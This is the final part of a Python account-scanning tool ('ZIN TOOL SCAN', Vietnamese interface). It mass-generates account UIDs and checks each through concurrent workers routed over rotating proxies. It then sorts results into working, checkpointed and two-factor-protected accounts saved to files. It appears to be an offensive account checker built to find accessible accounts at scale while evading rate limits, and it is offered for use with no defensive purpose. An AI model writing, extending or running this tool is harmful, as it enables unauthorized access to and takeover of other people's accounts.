        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} TOTAL IDS   "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{limit}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} SERIES      "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{name}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} CONCURRENCY "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{CONFIG['concurrency']}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} PROXY       "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}"
              f"{len(proxy_mgr.proxies) if CONFIG['enable_proxy'] else 'OFF'}"
              f"{C.R}")
        if CONFIG["dry_run"]:
            print(f"  {C.YELLOW}{C.B}[ ! ]{C.R} "
                  f"{C.YELLOW}DRY-RUN — KHÔNG GỬI REQUEST THẬT{C.R}")
        mini_sep()
        print(f"  {C.GOLD}{C.B}⚡ ZIN TOOL SCAN - VĨNH HẰNG THIÊN TÔN{C.R}")
        mini_sep()
        print()

        # Queue + Producer + Workers
        queue = asyncio.Queue(maxsize=CONFIG["queue_maxsize"])
        producer_done = asyncio.Event()
        seen_global = set()
        produced_count = [0]

        async def producer():
            try:
                remaining = limit
                chunk_size = CONFIG["uid_generate_chunk"]
                while remaining > 0 and not _STOP_EVENT.is_set():
                    need = min(chunk_size, remaining)
                    if is_random:
                        batch = generate_uid_random_mix(need, seen_global)
                    else:
                        batch = generate_uid_batch_unique(prefixes,
                                                           body_len,
                                                           need,
                                                           seen_global)
                    for uid in batch:
                        if _STOP_EVENT.is_set():
                            break
                        await queue.put(uid)
                        produced_count[0] += 1
                        remaining -= 1
                        if remaining <= 0:
                            break
            finally:
                producer_done.set()

        async def worker(checker):
            while True:
                try:
                    uid = await asyncio.wait_for(
                        queue.get(),
                        timeout=CONFIG["worker_poll_timeout"],
                    )
                except asyncio.TimeoutError:
                    if producer_done.is_set() and queue.empty():
                        return
                    continue
                except asyncio.CancelledError:
                    return
                try:
                    if not _STOP_EVENT.is_set():
                        await checker.check_account(uid)
                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    checker.stats.err += 1
                    sys.stderr.write(
                        f"[Worker] uid={uid} "
                        f"{type(e).__name__}: {e}\n")
                finally:
                    queue.task_done()

        async with AsyncChecker(proxy_mgr, stats, outputs, state) as checker:
            workers = [asyncio.create_task(worker(checker))
                       for _ in range(CONFIG["concurrency"])]
            producer_task = asyncio.create_task(producer())

            try:
                await producer_task
                await asyncio.gather(*workers, return_exceptions=True)
            except asyncio.CancelledError:
                for w in workers:
                    w.cancel()
                await asyncio.gather(*workers, return_exceptions=True)

        try:
            await outputs.finalize()
        except Exception as e:
            sys.stderr.write(f"[Main] finalize lỗi: {e}\n")

        try:
            await state.save()
        except Exception as e:
            sys.stderr.write(f"[Main] state save lỗi: {e}\n")

        self._print_summary(stats, outputs, produced_count[0])

        try:
            input(f"  {C.CYAN}➤ Nhấn Enter để thoát...{C.R}")
        except (EOFError, KeyboardInterrupt):
            print()

    def _print_summary(self, stats, outputs, produced):
        print()
        print("  " + rainbow_border("═", 58))
        print()
        print(f"  {C.GOLD}{C.B}          ✦ HOÀN TẤT ✦{C.R}")
        print()
        print("  " + rainbow_border("═", 58, palette=RAINBOW2))
        print()
        print(f"  {C.GREEN}{C.B}✓ OK        {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.ok}{C.R}")
        print(f"  {C.GOLD}{C.B}◐ CP        {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.cp}{C.R}")
        print(f"  {C.PINK}{C.B}🔐 2FA      {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.twofa}{C.R}")
        print(f"  {C.CRIMSON}{C.B}✗ Net err   {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.err}{C.R}")
        print(f"  {C.CRIMSON}{C.B}✗ Out err   {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.out_err}{C.R}")
        print(f"  {C.CYAN}{C.B}⚡ Tried     {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.tried}{C.R}")
        print(f"  {C.VIOLET}{C.B}↻ Retries   {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.retry}{C.R}")
        print(f"  {C.VIOLET}{C.B}⏱ Time      {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.uptime():.1f}s{C.R}")
        print(f"  {C.SKY}{C.B}◈ Rate      {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.rate():.1f}/s{C.R}")
        print(f"  {C.WHITE}{C.B}Σ Produced  {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{produced}{C.R}")
        print()
        print(f"  {C.GOLD}💾 Output: {C.WHITE}{CONFIG['output_dir']}{C.R}")
        for kind in ("ok", "cp", "2fa"):
            path = outputs.files.get(kind, {}).get("txt")
            if path and path.exists():
                print(f"     {C.GRAY}• {kind}: {path.name}{C.R}")
        print()
        print("  " + rainbow_border("✦", 58))
        print()


def main():
    try:
        ZinApp().main()
    except KeyboardInterrupt:
        print(f"\n\n  {C.RED}⏹ Đã dừng bởi người dùng{C.R}\n")
        sys.exit(0)
    except Exception as e:
        sys.stderr.write(f"\n  {C.RED}✗ Lỗi: "
                         f"{type(e).__name__}: {e}{C.R}\n")
        sys.exit(1)


if __name__ == "__main__":
    main()
